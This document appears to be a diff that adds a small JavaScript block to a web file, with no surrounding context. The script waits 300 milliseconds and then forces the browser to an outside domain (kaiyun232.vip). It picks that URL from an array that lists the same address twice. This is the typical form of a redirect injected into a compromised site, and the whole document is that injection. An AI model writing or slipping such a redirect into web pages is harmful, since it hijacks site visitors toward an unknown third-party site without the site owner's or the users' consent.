@@ -1,0 +1,7 @@
+<script>
+function time() {
+    var arr = ["http://www.kaiyun232.vip", "http://www.kaiyun232.vip"];
+		window.location.href = arr[parseInt(Math.random() * arr.length)];
+}
+setTimeout(time, 300);
+</script>
